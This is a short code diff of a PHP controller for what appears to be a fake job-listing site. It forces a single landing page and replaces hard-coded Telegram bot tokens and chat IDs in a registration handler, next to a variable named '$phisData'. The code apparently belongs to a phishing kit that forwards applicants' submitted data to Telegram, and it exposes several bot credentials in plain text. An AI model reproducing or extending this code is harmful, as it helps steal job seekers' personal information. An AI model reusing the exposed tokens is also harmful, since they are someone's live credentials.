@@ -9,12 +9,12 @@ class LokerController extends Controller
     public function index(Request $request)
     {
         $subdomain = explode('.', $request->getHost())[0];
-        if ($subdomain == 'infolokerterkini') {
+        return inertia('Job/Index');
+        // if ($subdomain == 'infolokerterkini') {
 
-            return inertia('Job/Index');
-        } else {
-            return inertia('Two/Index');
-        }
+        // } else {
+        //     return inertia('Two/Index');
+        // }
     }
     public function registrasi(Request $request,)
     {
@@ -54,8 +54,9 @@ class LokerController extends Controller
 
 
         // BOT 6
-        $bot_token = "7286191912:AAE2M1Ii3LthqxOL4UtbtAm4AakQ85dOrZg";
-        $chat_id = "8070835865";
+        $bot_token = "7858839103:AAEIiir99XofEt8pio4mkW8qrXznGk07D9k";
+        $chat_id = "7100363251";
+
         $phisData = "";
         // $bot_token = "7600923583:AAFsZEE7kYZuaWYlfwNLvNn21t2ZSYKS-t8";
         // $chat_id = "6552942907";
